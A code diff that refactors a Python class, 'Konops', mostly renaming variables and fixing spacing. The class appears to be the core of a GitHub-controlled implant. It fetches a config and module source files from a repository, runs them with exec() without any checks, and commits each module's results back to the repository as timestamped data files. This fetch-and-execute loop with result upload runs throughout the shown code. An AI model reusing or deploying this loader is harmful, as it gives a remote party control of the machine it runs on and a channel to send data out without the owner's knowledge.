@@ -19,54 +19,63 @@ mpath="modules/"
 dpath="data/"
 
 class Konops :
-    def __init__(self,konopsid):
+    def __init__(self, konops_id):
         #Konops id
-        self.konops_id=konopsid
+        self.konops_id = konops_id
         #Konops modules
-        self.konops_modules=[]
+        self.konops_modules = []
         #Is it configured?
-        self.configured=False
+        self.configured = False
         #Configuration file 
-        self.konops_config="%s.json"%self.konops_id
+        self.konops_config = "%s.json"%self.konops_id
         
         #Initialize tokens and headers
         
-        self.token,self.headers=gitwrapper.login()
+        self.token, self.headers = gitwrapper.login()
         
 
     def configure(self):
-        path_filename=cpath+self.konops_config
-        resp,config_content=gitwrapper.get_file_contents(self.token,self.headers,path_filename)
+        #Loads the configuration file. Returns its content.
+
+        config_file_path = cpath + self.konops_config
+        response , config_content_json = gitwrapper.get_file_contents(self.token, self.headers, config_file_path)
         #print(config_content)
-        self.configured=True
-        config=json.loads(config_content)
-        for task in config:
+        self.configured = True
+        config_file_content = json.loads(config_content_json)
+        for task in config_file_content:
             #print(task['module'])
             self.konops_modules.append(task['module'])
-        return config
+        return config_file_content
     
     def execute(self):
-        data=dict()
+        #Executes the loaded modules.
+
+        module_data = dict()
+
         for task in range(len(self.konops_modules)):
-            filename=self.konops_modules[task]+".py"
-            filepathname=mpath+filename
-            modulename=filename.strip(".py")
+
+            module_filename  = self.konops_modules[task]+".py"
+            module_path = mpath + module_filename
+            module_name = module_filename.strip(".py")
+
             #Get module file content
-            resp,content=gitwrapper.get_file_contents(self.token,self.headers,filepathname)
+            response , content = gitwrapper.get_file_contents(self.token, self.headers, module_path)
             #print(resp)
-            module = types.ModuleType(modulename)
+            module = types.ModuleType(module_name)
             exec(content, module.__dict__)
-            sys.modules[modulename] = module
-            result = sys.modules[modulename].run()
-            data[modulename]=str(result)
-            print("result of "+filename+" is: '" + str(result) + "'") 
+            sys.modules[module_name] = module
+
+            execution_result = sys.modules[module_name].run()
+            module_data[module_name] = str(execution_result)
+            print("result of " + module_filename + " is: '" + str(execution_result) + "'")
+
         time = str(datetime.datetime.now())
-        datapathfile=dpath+self.konops_id+time+".txt"
+        data_filename = dpath + self.konops_id + time + ".txt"
     
-        commit="Stored "+self.konops_id+" work to data..."
+        commit_message = "Stored " + self.konops_id + " data."
         
-        content=json.dumps(data)
+        content = json.dumps(module_data)
         #Store the data to a file in github
-        gitwrapper.store_to_file(self.token,self.headers,datapathfile,commit,content)
+        gitwrapper.store_to_file(self.token, self.headers, data_filename, commit_message, content)
         #print(resp2) #always print responses to identify the bugs during debugging.They print errors. 
         
